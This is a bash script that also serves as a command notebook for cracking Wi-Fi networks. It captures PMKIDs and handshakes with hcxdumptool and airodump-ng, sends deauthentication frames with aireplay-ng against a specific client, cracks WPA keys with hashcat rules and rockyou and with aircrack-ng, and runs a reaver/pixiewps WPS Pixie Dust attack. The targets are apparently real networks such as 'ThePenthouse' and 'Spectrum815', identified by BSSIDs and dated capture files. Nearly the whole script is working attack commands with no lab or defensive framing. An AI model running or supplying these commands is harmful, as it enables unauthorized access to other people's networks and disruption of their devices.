#!/bin/bash
scripts_dir=/opt/easy-linux
#install and use hcxtools w hashcat and jack
#
set -e
#
trap ${scripts_dir}/support/support-hcxdump2.sh EXIT
source ${scripts_dir}/.envrc
# Version: 0.0.4
#	timeout -v 32s ${scripts_dir}/support/support-hcxdump2.sh
	timeout -v 40s sudo hcxdumptool -i "${adapter}" --do_rcascan 
hcxpcapngtool --pmkid=/opt/easy-linux/support/misc/pmkid-04d4c4517691.22000 /opt/easy-linux/support/misc/pmkid.pcapng

tshark -r /tmp/user/0/wifite0tn8m90o/handshake.cap.bak -n -Y eapol

hcxdumptool -i wlan1 -c 11a -w /tmp/user/0/wifite0tn8m90o/pmkid.pcapng

# use airodump-ng to pick target, then specify target with:
sudo airodump-ng wlan1 -w wpa-capture --bssid 11:22:33:44:55 -c 1

# convert cap to pcap with
editcap -F pcap wpa-capture???.cap wpa-capture.pcap

# now convert your pcap to a pcapng 22000 file
hcxpcaptool -o hash.hc22000 wpa-capture???.pcap

# crack with Hashcat
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d --show
hashcat -m 22000 hash.hc22000 realhuman_phill.txt
# check hashcats rules with /usr/share/hashcat/rules     going to use best64.rule
hashcat -m 22000 hash.hc22000 realhuman_phill.txt -r /usr/share/hashcat/rules/best64.rule
# use rules with rockyou
hashcat -m 22000 hash.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# crack with aircrack-ng
aircrack-ng -a 2 -w /usr/share/dict/wordlist-probable.txt --bssid 80:78:71:C8:3A:E5 -l /tmp/user/0/wifite0tn8m90o/wpakey.txt hs/handshake_Spectrum815_80-78-71-C8-3A-E5_2023-05-26T11-13-11.cap

airodump-ng wlan1 -a -w /tmp/user/0/wifite0tn8m90o/wpa --write-interval 1 -c 11 --wps --bssid 7C:DB:98:2C:6F:0F --output-format pcap,csv

aireplay-ng -0 1 --ignore-negative-one -a 74:37:5F:06:7A:B7 -D -c 30:E1:71:A3:B6:D2 wlan1

#crack handshake:
aircrack-ng -a 2 -w /usr/share/dict/wordlist-probable.txt --bssid B0:FC:88:59:BC:01 -l /tmp/user/0/wifite0tn8m90o/wpakey.txt hs/handshake_ThePenthouse_B0-FC-88-59-BC-01_2023-05-26T09-52-57.cap


#check if handshake is valid
cowpatty  -r hs/handshake_ThePenthouse_B0-FC-88-59-BC-01_2023-05-26T09-52-57.cap -c

#check if handshake is valid
tshark -r hs/handshake_ThePenthouse_B0-FC-88-59-BC-01_2023-05-26T09-52-57.cap -n -Y eapol
tshark -r hs/handshake_ThePenthouse_B0-FC-88-59-BC-01_2023-05-26T09-52-57.cap -n -Y "wlan.fc.type_subtype == 0x08
 || wlan.fc.type_subtype == 0x05"

# wps attack
airodump-ng wlan1 -a -w /tmp/user/0/wifite0tn8m90o/pixie --write-interval 1 -c 2 --wps --bssid 7C:10:C9:57:D8:28 --output-format pcap,csv


reaver --interface wlan1 --bssid 7C:10:C9:57:D8:28 --channel 2 -vv -N -O reaver_output.pcap --pixie-dust 1

pixiewps -e 9d2b570b2110039817771fdd60f7e9bd818641bd5ef79a3d1ca3a0bbf8b4a963f9f77a692a0b3001c736c2e62087b4e4b70f3da835fb6658e65ebf277859a2da821deb23b47d4b8d2a4e17da35eaab910e6c0c7d0b75b508dda746a0635cf43d2b056402811789d7dba485353269373b9dc0e5002c3c84dcf7bef55715c21ab2f05abaed749337a4052894ff356aefb31bdc9a739a1f4a42d6b2d8d8ed62736aeaf297d03e2c539fd4daf2cef9ca003c0128a6624463f6f15ecfaa8f0e212158 -s d21b171b13434d69a584dca6b5f175d07f5f0ef86c06b5e1920da3b12b51299f -z 135a24518c62894e089c97db693ba8ebacaaf14bff9436d2d51fbece9527b998 -a 8efccd34e6d16024bc44fc25a35c4627cf74348e8e81756482095b5b6a9e291a -n 6e03f49a1a7748a54a2b51538a16b2bc -r 27441491faf5f691c817f6ea288add38da217040210ccf1faf131db10e7fa4260251cf323a47030ba7a72fbe4056fcdf4268be0dd8cc674636e4a7ec64ed73d07fea39e0694eb0b70ee84b501e92c5808aaa911784d2a45dcdba20dd907a37742135e45b4b1919ccac141708fc251d852b47ff3a3d1e7e644c5432cd530b95f14672fd8fd2cc809628484e903ae481f3694fe5c0b2426972e2a3e150be532aaa95d0cf70a0bd0d419b43373208f5cedb6ef8bd45e82133835796b78553af956a


sleep 1
#clear
printf "    ${OG}Restarting NetworkManager and wpa_supplicant..."
sudo systemctl start NetworkManager
sudo systemctl start wpa_supplicant
